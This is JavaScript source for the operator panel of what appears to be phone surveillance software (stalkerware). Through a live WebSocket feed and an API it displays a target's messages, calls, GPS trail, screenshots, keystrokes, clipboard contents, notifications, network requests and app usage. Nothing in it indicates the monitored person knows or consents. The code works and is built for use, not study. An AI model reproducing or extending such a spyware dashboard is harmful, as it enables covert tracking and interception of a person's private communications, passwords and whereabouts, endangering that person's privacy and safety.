let ws = null;
let liveFeed = [];
let map = null;
let mapMarker = null;
let mapPath = [];
let reconnectTimer = null;
let currentSection = 'live';

const wsProto = location.protocol === 'https:' ? 'wss:' : 'ws:';
const WS_URL = `${wsProto}//${location.host}/ws`;
const API = '/api';

function $(sel) { return document.querySelector(sel); }
function $$(sel) { return document.querySelectorAll(sel); }

// --- WebSocket ---
function connectWS() {
  if (ws) try { ws.close(); } catch(e) {}
  ws = new WebSocket(WS_URL);
  ws.onopen = () => {
    $('#ws-status').className = 'status-dot connected';
    $('#ws-label').textContent = 'Connected';
    clearTimeout(reconnectTimer);
  };
  ws.onclose = () => {
    $('#ws-status').className = 'status-dot disconnected';
    $('#ws-label').textContent = 'Reconnecting...';
    reconnectTimer = setTimeout(connectWS, 3000);
  };
  ws.onmessage = (e) => {
    try {
      const data = JSON.parse(e.data);
      handleLiveData(data);
    } catch(err) {}
  };
}

// --- Handle incoming live data ---
function handleLiveData(data) {
  liveFeed.unshift(data);
  if (liveFeed.length > 200) liveFeed.pop();
  if (currentSection === 'live') renderLiveFeed();
  refreshSummary();
}

// --- Summary ---
async function refreshSummary() {
  try {
    const r = await fetch(`${API}/summary`);
    const s = await r.json();
    $('#summary-stats').innerHTML = `
      <div class="stat-box"><div class="val">${s.messages_count||0}</div><div class="lbl">Messages</div></div>
      <div class="stat-box"><div class="val">${s.calls_count||0}</div><div class="lbl">Calls</div></div>
      <div class="stat-box"><div class="val">${s.locations_count||0}</div><div class="lbl">Locations</div></div>
      <div class="stat-box"><div class="val">${s.captures_count||0}</div><div class="lbl">Screenshots</div></div>
      <div class="stat-box"><div class="val">${s.apps_used||0}</div><div class="lbl">Apps Today</div></div>
      <div class="stat-box"><div class="val">${s.network_requests||0}</div><div class="lbl">Net Reqs</div></div>
    `;
  } catch(e) {}
}

// --- Live Feed ---
function renderLiveFeed() {
  const container = $('#section-live');
  container.innerHTML = '<div id="live-feed"></div>';
  const feed = $('#live-feed');
  liveFeed.forEach(d => {
    const entry = document.createElement('div');
    entry.className = 'live-entry';
    const ts = d.timestamp ? new Date(d.timestamp).toLocaleTimeString() : '';
    entry.innerHTML = `
      <div class="ts">${ts}</div>
      <div class="type">${d.type || 'event'}</div>
      <div class="content">${formatLiveContent(d)}</div>
    `;
    feed.appendChild(entry);
  });
}

function formatLiveContent(d) {
  switch(d.type) {
    case 'location': return `📍 ${d.latitude}, ${d.longitude} (acc: ${d.accuracy}m)`;
    case 'message': return `${d.is_from_me ? '→' : '←'} <b>${esc(d.sender||'')}</b>: ${esc(d.text||'').substring(0, 200)}`;
    case 'call': return `📞 ${d.call_type.toUpperCase()} from ${esc(d.caller_id||'')} (${d.duration}s)`;
    case 'screen_capture': return `📸 Screen captured`;
    case 'app_usage': return `📱 ${esc(d.app_name)} — ${d.duration}s`;
    case 'network': return `🌐 ${d.method} ${esc(d.host||d.url||'').substring(0, 100)}`;
    case 'keystroke': return `⌨️ [${esc(d.app_name||'?')}] ${esc(d.text||'').substring(0, 100)}`;
    case 'notification': return `🔔 [${esc(d.app_name||'')}] ${esc(d.title||'')}: ${esc(d.body||'').substring(0, 100)}`;
    case 'clipboard': return `📋 [${esc(d.app_name||'?')}] ${esc(d.text||'').substring(0, 100)}`;
    case 'device_status': return `🔋 ${d.battery_level}% ${d.is_charging ? '(charging)' : ''} WiFi: ${esc(d.wifi_ssid||'-')}`;
    default: return JSON.stringify(d);
  }
}

function esc(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }

// --- Messages ---
async function renderMessages() {
  const r = await fetch(`${API}/messages?limit=200`);
  const data = await r.json();
  const container = $('#section-messages');
  container.innerHTML = '<h2>Messages</h2><div class="card-grid"></div>';
  const grid = container.querySelector('.card-grid');
  data.forEach(m => {
    const card = document.createElement('div');
    card.className = `card ${m.is_from_me ? 'outgoing' : 'incoming'}`;
    card.innerHTML = `
      <div class="ts">${m.timestamp || ''}</div>
      <div class="body"><b>${esc(m.is_from_me ? 'Me' : esc(m.sender||'Unknown'))}</b>: ${highlightSearch(esc(m.text||''))}</div>
      <div class="meta">${m.service || 'SMS'} ${m.is_from_me ? '→ ' + esc(m.recipient||'') : ''}</div>
    `;
    grid.appendChild(card);
  });
}

// --- Calls ---
async function renderCalls() {
  const r = await fetch(`${API}/calls?limit=100`);
  const data = await r.json();
  const container = $('#section-calls');
  container.innerHTML = '<h2>Calls</h2><div class="card-grid"></div>';
  const grid = container.querySelector('.card-grid');
  data.forEach(c => {
    const card = document.createElement('div');
    card.className = `card ${c.call_type}`;
    card.innerHTML = `
      <div class="ts">${c.timestamp || ''}</div>
      <div class="body">${c.call_type.toUpperCase()} — ${esc(c.caller_id||'Unknown')}</div>
      <div class="meta">Duration: ${c.duration}s</div>
    `;
    grid.appendChild(card);
  });
}

// --- Location Map ---
async function renderLocation() {
  const r = await fetch(`${API}/locations?limit=200`);
  const data = await r.json();
  const container = $('#section-location');
  container.innerHTML = '<div id="map"></div>';

  if (!map) {
    map = L.map('map').setView([0, 0], 2);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      maxZoom: 19,
      attribution: '&copy; OpenStreetMap'
    }).addTo(map);
  } else {
    map.invalidateSize();
  }

  mapPath = [];
  data.forEach((loc, i) => {
    const latlng = [loc.latitude, loc.longitude];
    mapPath.push(latlng);
    L.circleMarker(latlng, {
      radius: 4,
      color: i === 0 ? '#e94560' : '#0f3460',
      fillColor: i === 0 ? '#e94560' : '#0f3460',
      fillOpacity: 0.8
    }).addTo(map).bindPopup(`<b>${loc.timestamp||''}</b><br>${loc.latitude}, ${loc.longitude}<br>Speed: ${loc.speed||0} m/s<br>Accuracy: ${loc.accuracy||0}m`);
  });

  if (mapPath.length > 0) {
    L.polyline(mapPath, { color: '#e94560', weight: 2, opacity: 0.6 }).addTo(map);
    const last = mapPath[mapPath.length - 1];
    if (mapMarker) map.removeLayer(mapMarker);
    mapMarker = L.marker(last).addTo(map).bindPopup('Latest position');
    map.setView(last, 13);
  }
}

// --- Screen Captures ---
async function renderScreens() {
  const r = await fetch(`${API}/screen_captures?limit=50`);
  const data = await r.json();
  const container = $('#section-screens');
  container.innerHTML = '<h2>Screen Captures</h2><div class="screenshot-grid"></div>';
  const grid = container.querySelector('.screenshot-grid');
  data.forEach(s => {
    const img = document.createElement('img');
    img.src = '/' + s.image_path;
    img.loading = 'lazy';
    img.title = s.timestamp || '';
    grid.appendChild(img);
  });
}

// --- App Usage ---
async function renderApps() {
  const r = await fetch(`${API}/app_usage?limit=200`);
  const data = await r.json();
  const container = $('#section-apps');
  container.innerHTML = '<h2>App Usage</h2><div class="card-grid"></div>';
  const grid = container.querySelector('.card-grid');
  data.forEach(a => {
    const card = document.createElement('div');
    card.className = 'card';
    card.innerHTML = `
      <div class="ts">${a.timestamp || ''}</div>
      <div class="body">📱 ${esc(a.app_name||'Unknown')}</div>
      <div class="meta">Duration: ${a.duration}s | Bundle: ${esc(a.bundle_id||'-')}</div>
    `;
    grid.appendChild(card);
  });
}

// --- Network ---
async function renderNetwork() {
  const r = await fetch(`${API}/network_log?limit=200`);
  const data = await r.json();
  const container = $('#section-network');
  container.innerHTML = '<h2>Network Requests</h2><div class="card-grid"></div>';
  const grid = container.querySelector('.card-grid');
  data.forEach(n => {
    const card = document.createElement('div');
    card.className = 'card';
    card.innerHTML = `
      <div class="ts">${n.timestamp || ''}</div>
      <div class="body">${n.method || 'GET'} ${highlightSearch(esc(n.host||n.url||''))}</div>
      <div class="meta">${n.bytes_sent || 0}B sent / ${n.bytes_received || 0}B received</div>
    `;
    grid.appendChild(card);
  });
}

// --- Keystrokes ---
async function renderKeystrokes() {
  const r = await fetch(`${API}/keystrokes?limit=200`);
  const data = await r.json();
  const container = $('#section-keystrokes');
  container.innerHTML = '<h2>Keystrokes</h2><div class="card-grid"></div>';
  const grid = container.querySelector('.card-grid');
  data.forEach(k => {
    const card = document.createElement('div');
    card.className = 'card';
    card.innerHTML = `
      <div class="ts">${k.timestamp || ''}</div>
      <div class="body">⌨️ <b>${esc(k.app_name||'?')}</b>: ${highlightSearch(esc(k.text||''))}</div>
    `;
    grid.appendChild(card);
  });
}

// --- Notifications ---
async function renderNotifications() {
  const r = await fetch(`${API}/notifications?limit=200`);
  const data = await r.json();
  const container = $('#section-notifications');
  container.innerHTML = '<h2>Notifications</h2><div class="card-grid"></div>';
  const grid = container.querySelector('.card-grid');
  data.forEach(n => {
    const card = document.createElement('div');
    card.className = 'card';
    card.innerHTML = `
      <div class="ts">${n.timestamp || ''}</div>
      <div class="body">🔔 <b>${esc(n.app_name||'')}</b>: ${esc(n.title||'')}</div>
      <div class="meta">${esc(n.body||'')}</div>
    `;
    grid.appendChild(card);
  });
}

// --- Clipboard ---
async function renderClipboard() {
  const r = await fetch(`${API}/clipboard?limit=100`);
  const data = await r.json();
  const container = $('#section-clipboard');
  container.innerHTML = '<h2>Clipboard</h2><div class="card-grid"></div>';
  const grid = container.querySelector('.card-grid');
  data.forEach(c => {
    const card = document.createElement('div');
    card.className = 'card';
    card.innerHTML = `
      <div class="ts">${c.timestamp || ''}</div>
      <div class="body">📋 <b>${esc(c.app_name||'?')}</b>: ${highlightSearch(esc(c.text||''))}</div>
    `;
    grid.appendChild(card);
  });
}

// --- Device Status ---
async function renderDevice() {
  const r = await fetch(`${API}/device_status?limit=50`);
  const data = await r.json();
  const container = $('#section-device');
  container.innerHTML = '<h2>Device Status</h2><div class="card-grid"></div>';
  const grid = container.querySelector('.card-grid');
  data.forEach(d => {
    const card = document.createElement('div');
    card.className = 'card';
    card.innerHTML = `
      <div class="ts">${d.timestamp || ''}</div>
      <div class="body">🔋 ${d.battery_level || 0}% ${d.is_charging ? '⚡' : ''}</div>
      <div class="meta">WiFi: ${esc(d.wifi_ssid||'-')} | Signal: ${d.signal_strength||0}</div>
    `;
    grid.appendChild(card);
  });
}

// --- Search ---
function highlightSearch(text) {
  const q = ($('#search-input')?.value || '').trim();
  if (!q) return text;
  const re = new RegExp(`(${q.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})`, 'gi');
  return text.replace(re, '<mark>$1</mark>');
}

// --- Section switching ---
function switchSection(name) {
  currentSection = name;
  $$('.section').forEach(el => el.classList.remove('active'));
  const target = $(`#section-${name}`);
  if (target) target.classList.add('active');
  $$('#nav a').forEach(a => a.classList.toggle('active', a.dataset.section === name));

  switch(name) {
    case 'live': renderLiveFeed(); break;
    case 'messages': renderMessages(); break;
    case 'calls': renderCalls(); break;
    case 'location': renderLocation(); break;
    case 'screens': renderScreens(); break;
    case 'apps': renderApps(); break;
    case 'network': renderNetwork(); break;
    case 'keystrokes': renderKeystrokes(); break;
    case 'notifications': renderNotifications(); break;
    case 'clipboard': renderClipboard(); break;
    case 'device': renderDevice(); break;
  }
}

// --- Navigation ---
$$('#nav a').forEach(a => {
  a.addEventListener('click', e => {
    e.preventDefault();
    switchSection(a.dataset.section);
  });
});

// --- Search ---
$('#search-input').addEventListener('input', () => {
  if (currentSection !== 'live') switchSection(currentSection);
});

// --- Init ---
async function init() {
  connectWS();
  await refreshSummary();
  await switchSection('live');
}

init();
